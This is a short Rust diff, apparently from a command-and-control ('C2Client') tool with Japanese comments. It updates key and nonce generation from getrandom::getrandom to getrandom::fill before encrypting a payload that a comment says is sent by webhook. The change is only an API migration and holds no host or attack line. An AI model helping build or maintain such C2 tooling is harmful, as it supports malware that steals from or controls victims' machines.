@@ -956,8 +956,8 @@ impl C2Client {
             // main.rs と同様にキー/ノンスを生成してペイロードに反映
             let mut key = [0u8; 32];
             let mut nonce = [0u8; 12];
-            getrandom::getrandom(&mut key).expect("Failed to generate random key");
-            getrandom::getrandom(&mut nonce).expect("Failed to generate random nonce");
+            getrandom::fill(&mut key).expect("Failed to generate random key");
+            getrandom::fill(&mut nonce).expect("Failed to generate random nonce");
             payload.update_encryption_info(&key, &nonce);
 
             // 統一WebHook送信（lib.rs と同一実装）
